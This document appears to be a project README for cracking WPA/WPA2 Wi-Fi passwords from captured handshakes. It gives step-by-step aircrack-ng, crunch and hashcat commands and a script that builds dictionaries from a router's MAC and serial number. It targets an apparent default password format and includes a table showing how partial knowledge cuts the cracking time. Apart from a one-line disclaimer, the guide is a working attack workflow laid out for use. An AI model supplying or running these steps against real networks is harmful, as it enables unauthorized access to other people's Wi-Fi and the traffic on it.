# WPA/WPA2 Cracking Guide

This guide explains how to use the tools in this project to crack WPA/WPA2 handshakes.

> ⚠️ For learning and authorized testing only.

## Prerequisites

- `aircrack-ng` installed: `apt install aircrack-ng`
- `crunch` installed: `apt install crunch`
- A pcap file containing a complete 4-way handshake
- ESSID (WiFi name) and BSSID (MAC address) of the target

## Step 1: Verify the Handshake

```bash
python3 check_handshake.py handshake.pcap
```

Confirm at least 1 complete EAPOL handshake (Message 1/2/3/4) is present.

## Step 2: Targeted Dictionary (Try First)

Generate candidate passwords based on router hardware info (MAC/SN/CMEI). High hit rate, fast.

### Edit Configuration

Open `gen_targeted_dict.py` and modify:

```python
MAC = "AABBCCDDEEFF"        # Router MAC (12 chars, no colons)
SN = "XXXXXXXXXXXX"         # Serial number
CMEI = "000000000000000"    # CMEI (optional)

KNOWN_DIGIT = ""            # Second-to-last digit (0-9), leave empty if unknown
KNOWN_LAST_CHAR = ""        # Last character (a-z), leave empty if unknown
KNOWN_PREFIX = ""           # Known prefix, leave empty if unknown
```

### Generate and Crack

```bash
./crack_with_dict.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" handshake.pcap
```

Targeted dictionaries usually have hundreds to thousands of candidates, finished within minutes.

## Step 3: Brute-force (After Dictionary Fails)

If the targeted dictionary doesn't hit, consider brute-force.

### Password Format

Default format: `6 lowercase letters + 1 digit + 1 lowercase letter`, total 8 characters.

If you know partial information, you can greatly reduce the search space:

| Known Info | Combinations | 2-core VPS | Mid-range GPU |
|-----------|-------------|-----------|--------------|
| Nothing | 80.3 billion | ~5 years | days |
| Known digit | 8 billion | ~6 months | hours |
| Known last letter | 3.1 billion | ~2 months | 1 hour |
| Known digit + last letter | 308 million | ~1 week | minutes |

### Split Strategy

Split into 26 parts by first letter, each part runs one letter:

```bash
# Run all combinations starting with letter 'a'
./crack_split.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" a

# When digit and last letter are known
./crack_split.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" -d 2 -l f a
```

### Run in Background

```bash
apt install screen -y
screen -S wifi -dm ./crack_split.sh -b "..." -e "..." -d 2 -l f a

# Check status
screen -r wifi

# Exit (without stopping): Ctrl+A then D
```

### Check Progress

```bash
tail -f crack_a.log
```

## Recommended Workflow

1. ✅ **Run targeted dictionary first** (minutes, high hit rate)
2. ✅ If you know the password pattern, fill in known characters to narrow the range
3. ⚠️ **Brute-force last** (time-consuming, GPU recommended)

## GPU Acceleration (Optional)

If you have an NVIDIA GPU, hashcat is dozens of times faster:

```bash
# Convert format
apt install hcxtools
hcxpcapngtool -o hash.hc22000 handshake.pcap

# Mask attack (6 lowercase + 1 digit + 1 lowercase)
hashcat -m 22000 -a 3 hash.hc22000 ?l?l?l?l?l?l?d?l

# Known digit=2 last char=f
hashcat -m 22000 -a 3 hash.hc22000 ?l?l?l?l?l?l2f
```
